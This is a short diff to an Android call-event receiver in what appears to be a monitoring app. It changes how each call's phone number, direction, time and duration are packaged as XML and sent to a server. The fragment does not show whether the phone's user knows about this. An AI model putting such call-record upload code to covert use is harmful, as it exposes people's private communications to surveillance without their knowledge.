@@ -18,8 +18,8 @@ import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
-import com.inet.android.bs.DataSendHandler;
 import com.inet.android.bs.FileLog;
+import com.inet.android.bs.Request;
 import com.inet.android.bs.WorkTimeDefiner;
 
 public class CallReceiver extends BroadcastReceiver {
@@ -32,6 +32,7 @@ public class CallReceiver extends BroadcastReceiver {
 	String date;
 	SharedPreferences sp;
 	private static String LOG_TAG = "callReciver";
+	Request req;
 
 	@Override
 	public void onReceive(Context arg0, Intent intent) {
@@ -139,9 +140,8 @@ public class CallReceiver extends BroadcastReceiver {
 				+ "</id><time>" + date + "</time><type>4</type><app>" + dir
 				+ "</app><ttl>" + phNumber + "</ttl><ntime>" + callDuration
 				+ "</ntime></packet>";
-
-		DataSendHandler dSH = new DataSendHandler(ctx);
-		dSH.send(1, sendStr);
+		req = new Request(ctx);
+		req.sendRequest(sendStr);
 
 		Log.d("callRec", sb.toString());
 		FileLog.writeLog("Callreciver: " + sb.toString());
